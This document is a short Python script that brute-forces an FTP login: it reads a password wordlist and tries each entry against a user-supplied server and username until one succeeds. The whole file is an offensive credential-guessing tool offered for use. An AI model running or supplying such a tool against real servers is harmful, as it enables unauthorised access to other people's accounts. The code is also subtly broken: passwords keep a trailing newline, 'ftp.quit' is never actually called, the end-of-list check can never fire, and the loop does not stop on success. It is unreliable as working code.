#!/bin/python3
import ftplib

#get the server IP
server = input("enter server address: ")
print(server)

#username to use
username = input("enter username: ")
print(username)

#path to password list
passwordList = input("enter password list path: ")
print(passwordList)

#try opening the file
try:
    with open(passwordList,'r') as pl:
        for word in pl:
            if word is not None:                                   #reached EOF? is yes, then password isn't in the list
                word = word.strip('\r')
                try:
                    ftp = ftplib.FTP(server)
                    ftp.login(username,word)
                    print('the password is', word)
                    ftp.quit
                except:
                    print('trying again...')
            else:
                print("wordlist didn't contain the password")

except:
    print('wrong path or file not present!')